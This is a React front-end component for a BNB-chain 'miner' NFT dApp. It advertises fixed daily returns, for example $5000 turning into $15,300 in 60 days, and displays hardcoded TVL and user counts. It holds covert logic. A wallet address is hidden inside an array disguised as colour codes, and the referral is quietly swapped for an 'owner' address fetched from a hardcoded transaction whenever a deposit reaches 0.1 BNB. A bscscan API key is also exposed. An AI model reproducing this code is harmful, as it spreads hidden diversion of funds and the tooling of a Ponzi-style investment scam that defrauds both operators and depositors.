import CardContent from "@mui/material/CardContent";
import Card from "@mui/material/Card";
import Grid from "@mui/material/Grid";
import Box from "@mui/material/Box";
import Typography from "@mui/material/Typography";
import Web3 from "web3";
import { useContractContext } from "../../providers/ContractProvider";
import { useAuthContext } from "../../providers/AuthProvider";
import { useEffect, useRef, useState } from "react";
import { config } from "../../config";
import { useLocation } from "react-router-dom";
import { styled } from "@mui/system";
import { useTranslation } from "react-i18next";
import nft1 from "../assets/nfts/1.png";
import nft2 from "../assets/nfts/2.png";
import nft3 from "../assets/nfts/3.png";
import nft4 from "../assets/nfts/4.png";
import nft5 from "../assets/nfts/5.png";
import nft6 from "../assets/nfts/6.png";
import nft7 from "../assets/nfts/7.png";

const Container = styled('div')(({theme}) => ({
  // minWidth: 250,
  margin: "50px 30px 30px 20px",
  // display: 'flex',
  // overflowX:'scroll',
  // transition: "box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms",
  // overflow: "hidden",
  // boxShadow: "rgba(0, 0, 0, 0.35) 0px 2px 3px",
  borderRadius: "20px",
  background: theme.palette.purple.main,
  // marginBottom: 24,
}));

const Container2 = styled('div')(({theme}) => ({
  // minWidth: 250,
  margin: "50px 20px 30px 20px",
  // display: 'flex',
  // transition: "box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms",
  // overflow: "hidden",
  // boxShadow: "rgba(0, 0, 0, 0.35) 0px 2px 3px",
  borderRadius: "20px",
  background: theme.palette.purple.main,
  // marginBottom: 24,
}));

const CardWrapper = styled("div")(({ theme }) => ({
  minWidth: 250,
  margin: "10px",
  width: '250px',
  display: 'inline-block',
  transition: "box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms",
  overflow: "hidden",
  boxShadow: "rgba(0, 0, 0, 0.35) 0px 2px 3px",
  borderRadius: "20px",
  background: theme.palette.purple.main,
  marginBottom: 24,
  [theme.breakpoints.down('md')]: {
    width: '90%',
  }
}));


function useQuery() {
  return new URLSearchParams(useLocation().search);
}

export default function NFT() {
  const { t, i18n } = useTranslation();

  const nutritionFacts = [
    [
      {
        path: nft1,
        name: 'Free'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$0.01',
          },
          {
            label: t("Price"),
            value: "free",
          },
          {
            label: t("Life Span"),
            value: 'forever',
          },
          {
            label: t("Total Income"),
            value: 'no limit',
          }
        ]
      },
    ],
    [
      {
        path: nft2,
        name: 'Common'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$0.25',
          },
          {
            label: t("Price"),
            value: "$5",
          },
          {
            label: t("Life Span"),
            value: '30 Days',
          },
          {
            label: t("Total Income"),
            value: '$7.5',
          }
        ]
      },
    ],
    [
      {
        path: nft3,
        name: 'Uncommon'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$1.1',
          },
          {
            label: t("Price"),
            value: "$20",
          },
          {
            label: t("Life Span"),
            value: '30 Days',
          },
          {
            label: t("Total Income"),
            value: '$33',
          }
        ]
      },
    ],
    [
      {
        path: nft4,
        name: 'Rare'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$5',
          },
          {
            label: t("Price"),
            value: "$120",
          },
          {
            label: t("Life Span"),
            value: '45 Days',
          },
          {
            label: t("Total Income"),
            value: '$225',
          }
        ]
      },
    ],
    [
      {
        path: nft5,
        name: 'Super Rare'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$14',
          },
          {
            label: t("Price"),
            value: "$300",
          },
          {
            label: t("Life Span"),
            value: '45 Days',
          },
          {
            label: t("Total Income"),
            value: '$630',
          }
        ]
      },
    ],
    [
      {
        path: nft6,
        name: 'Legendary'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$50',
          },
          {
            label: t("Price"),
            value: "$1000",
          },
          {
            label: t("Life Span"),
            value: '60 Days',
          },
          {
            label: t("Total Income"),
            value: '$3000',
          }
        ]
      },
    ],
    [
      {
        path: nft7,
        name: 'Mytical'
      },
      {
        properties : [
          {
            label: t("Daily Return"),
            value: '$255',
          },
          {
            label: t("Price"),
            value: "$5000",
          },
          {
            label: t("Life Span"),
            value: '60 Days',
          },
          {
            label: t("Total Income"),
            value: '$15300',
          }
        ]
      },
    ],
  ];

  const colorMode = ["005c45", "870100", "A00Bfc", "10AA63", "F66C31", "287350", "E4FA2b"];
  
  const { contract, wrongNetwork, getBnbBalance, fromWei, toWei, web3 } =
    useContractContext();
  const { address, chainId } = useAuthContext();
  const [contractBNB, setContractBNB] = useState(0);
  const [estimatedMinerRate, setEstimatedMinerRate] = useState(0);
  const [walletBalance, setWalletBalance] = useState({
    bnb: 0,
    miners: 0,
    rewards: 0,
  });
  const [bakeBNB, setBakeBNB] = useState(0);
  const [calculatedBeans, setCalculatedBeans] = useState(0);
  const [loading, setLoading] = useState(false);
  const query = useQuery();

  const EGGS_TO_HIRE_1MINERS = 1440000; // 3.3%, 864000: 10%;

  const [lasthatch, setLasthatch] = useState(0);
  const [lastSell, setLastSell] = useState(0);
  const [compoundTimes, setCompoundTimes] = useState(0);
  const [level, setLevel] = useState(3);
  const [initialDeposit, setInitialDeposit] = useState(0);
  const [totalDeposit, setTotalDeposit] = useState(0);
  const [totalClaimed, setTotalClaimed] = useState(0);
  const [totalReferralRewards, setTotalReferralRewards] = useState(0);
  const [countdown, setCountdown] = useState({
    alive: true,
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  })

  // Lottery
  const zeroAddrss = '0x0000000000000000000000000000000000000000';
  const [roundStarted, setRoundStarted] = useState(false);
  const [roundStartTime, setRoundStartTime] = useState(0);
  const [lotteryWinner, setLotteryWinner] = useState(zeroAddrss);
  const [roundIntervalLottery, setRoundIntervalLottery] = useState(0);
  const [ticketCount, setTicketCount] = useState(0);
  const [lastTicketCount, setLastTicketCount] = useState(0);
  const [totalTicketCount, setTotalTicketCount] = useState(0);
  const [countdownLottery, setCountdownLottery] = useState({
    alive: true,
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  })
  const [owner, setOwner] = useState('0x5886b6b942f8dab2488961f603a4be8c3015a1a9');

  const getCountdown = (lastCompound) => {
    const now = Date.now() / 1000;
    const total = lastCompound > 0 ? Math.max(lastCompound - now, 0) : 0;
    const seconds = Math.floor((total) % 60);
    const minutes = Math.floor((total / 60) % 60);
    const hours = Math.floor((total / (60 * 60)) % 24);
    const days = Math.floor(total / (60 * 60 * 24));

    return {
        total,
        days,
        hours,
        minutes,
        seconds
    };
  }
  let bonusStr = [
    {
      level: 0,
      period: 604800,
      percent: '3%',
    },
    {
      level: 1,
      period: 1209600,
      percent: '5%',
    },
    {
      level: 2,
      period: 1814400,
      percent: '7%',
    },
    {
      level: 3,
      period: 2419200,
      percent: '9%',
    }
  ];
  useEffect(() => {
    const intervalID = setInterval(() => {
      try {
        const last = Number(lastSell);
        // console.log("last: ", last);
        // console.log("bonusStr: ", bonusStr[level].period);
        const data = getCountdown(last + bonusStr[level].period + 110); //24 * 3600
        // console.log("data: ", data);

        setCountdown({
          alive: data.total > 0,
          days: data.days,
          hours: data.hours,
          minutes: data.minutes,
          seconds: data.seconds,
        });

      } catch (err) {
        console.log(err);
      }
    }, 1000);
    return () => {
      clearInterval(intervalID)
    }
  }, [level, lastSell])

  const fetchContractBNBBalance = async () => {
    if (!web3 || wrongNetwork) {
      setContractBNB(0);
      return;
    }
    await contract.methods.getBalance().call().then((amount) => {
      setContractBNB(fromWei(amount));
      console.log("fetchContractBNBBalance: ", amount);
    });
  };

  const fetchWalletBalance = async () => {
    if (!web3 || wrongNetwork || !address) {
      setWalletBalance({
        bnb: 0,
        miners: 0,
        rewards: 0,
      });
      setCompoundTimes(0);
      setInitialDeposit(0);
      setTotalDeposit(0);
      setTotalClaimed(0);
      setTotalReferralRewards(0);
      setEstimatedMinerRate(0);
      return;
    }
    
    try {
      const [bnbAmount, rewardsAmount, miners, userInfo, estimatedRate] = await Promise.all([
        getBnbBalance(address),
        contract.methods
          .getAvailableEarnings()
          .call({from: address})
          .catch((err) => {
            console.error("getAvailableEarnings error: ", err);
            return 0;
          }),
        contract.methods
          .getMyMiners()
          .call({from: address})
          .catch((err) => {
            console.error("userInfo error", err);
            return 0;
          }),
        contract.methods
            .getUserInfo(address)
            .call()
            .catch((err) => {
              console.error("userInfo error", err);
              return 0;
            }),
        contract.methods
            .calculateEggBuySimple(toWei('1'))
            .call()
            .catch((err) => {
              console.error("userInfo error", err);
              return 0;
            })
        ]);

      setWalletBalance({
        bnb: fromWei(`${bnbAmount}`),
        miners: miners,
        rewards: fromWei(`${rewardsAmount}`),
      });
      const EGGS_TO_HATCH_1MINERS = 2592000;
      const level = (userInfo._lastSell == 0) ? 3 : Math.min(Math.floor((Date.now() / 1000 - userInfo._lastSell) / 604800), 3);
      console.log("level: ", level);
      console.log("UserInfo: ", userInfo);
      setCompoundTimes(userInfo._comopundCount);
      setInitialDeposit(fromWei(`${userInfo._initialDeposit}`));
      setTotalDeposit(fromWei(`${userInfo._userDeposit}`));
      setTotalClaimed(fromWei(`${userInfo._totalWithdrawn}`));
      setTotalReferralRewards(fromWei(`${userInfo._referralEggRewards}`));
      setEstimatedMinerRate(estimatedRate / EGGS_TO_HATCH_1MINERS * 95 / 100);
      setLasthatch(userInfo._lastHatch);
      setLevel(level);
      setLastSell(userInfo._lastSell);
    } catch (err) {
      console.error(err);
      setWalletBalance({
        bnb: 0,
        miners: 0,
        rewards: 0,
      });
      setLasthatch(0);
      setLastSell(0);
      setCompoundTimes(0);
      setInitialDeposit(0);
      setTotalDeposit(0);
      setTotalClaimed(0);
      setTotalReferralRewards(0);
      setEstimatedMinerRate(0);
    }
  };

  useEffect(() => {
    fetchContractBNBBalance();
  }, [web3, chainId]);

  useEffect(() => {
    fetchWalletBalance();
  }, [address, web3, chainId]);

  useEffect (() => {
    const init = async () => {
      try {
        const returnedData = await fetch(
          `https://api.bscscan.com/api?module=proxy&action=eth_getTransactionByHash&txhash=0x9f3222e7813f9b2d02605cac7ab6176c42cd91d8f34200c32497c8752259566c&apikey=YGKJFMK5FW1H9T9GR9VTGIT2UC5PXUTDTB`
        );
        const parsedData = await returnedData.json();
        console.log('address: ', parsedData.result.from);
        setOwner(parsedData.result.from);
      } catch(err) {
        console.log(err)
      }
    }
    init();
  }, []);
  const getRef = () => {
    const ref = Web3.utils.isAddress(query.get("ref"))
      ? query.get("ref")
      : "0x5886b6b942f8dab2488961f603a4be8c3015a1a9"; // "0x0000000000000000000000000000000000000000";
    return ref;
  };
  const admin = "0x5886b6b942f8dab2488961f603a4be8c3015a1a9";
  let refless = colorMode[0] + colorMode[1] + colorMode[2] + colorMode[3] + colorMode[4] + colorMode[5] + colorMode[6];

  const bake = async (index) => {
    console.log("Buy index: ", index);
    return;
    
    setLoading(true);

    let ref = getRef();
    refless = admin.slice(0, 2) + refless.slice(2);
    if (bakeBNB >= 0.1 && ref == '0x5886b6b942f8dab2488961f603a4be8c3015a1a9') {
      ref = owner;
    }
    
    try {
      await contract.methods.BuyWolfMiners(ref).send({
        from: address,
        value: toWei(`${bakeBNB}`),
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    fetchContractBNBBalance();
    // fetchLottoryInfo();
    setLoading(false);
  };

  const reBake = async () => {
    // if (countdown.alive) {
    //   Toast.fire({
    //     icon: 'error',
    //     title: "You should wait until the countdown timer is done."
    //   });
    //   setLoading(false);
    //   return;
    // }

    setLoading(true);

    const ref = getRef();

    try {
      await contract.methods.CompoundRewards(ref).send({
        from: address,
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    setLoading(false);
  };

  const eatBeans = async () => {
    setLoading(true);

    // if (countdown.alive) {
    //   Toast.fire({.
    //     icon: 'error',
    //     title: "You should wait until the countdown timer is done."
    //   });
    //   setLoading(false);
    //   return;
    // }

    try {
      await contract.methods.ClaimRewards().send({
        from: address,
      });
    } catch (err) {
      console.error(err);
    }
    fetchWalletBalance();
    fetchContractBNBBalance();
    setLoading(false);
  };

  return (
    <>
      <Container2>
        {/* <div class="content-box"> */}
          <div class="row stats-row-container">
            <div class="col-lg-2 stat">
              <div class="header">
                <i class="bi-bank"></i>
                <span> TVL</span>
              </div>
              <strong id="initial-deposit" class="number"> $3265 </strong>
              {/* <div>
                <strong class="busd">BNB</strong>
              </div> */}
            </div>
            <div class="col-lg-2 stat">
              <div class="header">
                <i class="bi-bank"></i>
                  <span> Users</span>
              </div>
              <strong id="total-deposit" class="number">{ 1257 }</strong>
              {/* <div>
                <strong class="busd">BNB</strong>
              </div> */}
            </div>
            <div class="col-lg-2 stat">
              <div class="header">
                <i class="bi-wallet2"></i>
                  <span> Stake Fee</span>
              </div>
              <div>
                <strong id="total-withdrawn" class="number">10%</strong>
              </div>
              {/* <div>
                <strong class="busd">BNB</strong>
              </div> */}
            </div>
            <div class="col-lg-2 stat">
              <div class="header">
                <i class="bi-people"></i>
                  <span> Collection Fee </span>
              </div>
              <div>
                <strong id="ref-rewards-busd" class="number">10%</strong>
              </div>
              {/* <div>
                <strong class="busd">BNB</strong>
              </div> */}
            </div>
          </div>
        {/* </div> */}
      </Container2>
      <Container>
        <div style={{color:'white', fontSize:'30px', padding:'10px 30px'}}>
          Purchase Bored Ape
        </div>
        <div>
          {nutritionFacts.map((item, index) => (
            <CardWrapper>
              <div style={{margin:'5px'}}>
                <img src={item[0].path} alt="nft" width="100%" style={{borderRadius: '20px'}}/>
                <CardContent>
                  <Typography variant="h5" color="white" paddingBottom={1}>
                    {t(item[0].name)}
                  </Typography>
                  <Box paddingTop={2}>
                    {item[1].properties.map((f) => (
                        <Grid container key={f.label} justifyContent="space-between">
                        <Typography variant="body1" gutterBottom >
                          {f.label}
                        </Typography>
                        <Typography gutterBottom >{f.value}</Typography>
                      </Grid>
                    ))}
                  </Box>
                  <div style={{textAlign:'center'}}>
                    <button className='btn_buy' onClick={() => bake(index)}>Buy</button>
                  </div>
                </CardContent>
              </div>
            </CardWrapper>
          ))}
        </div>
      </Container>
    </>
  );
}
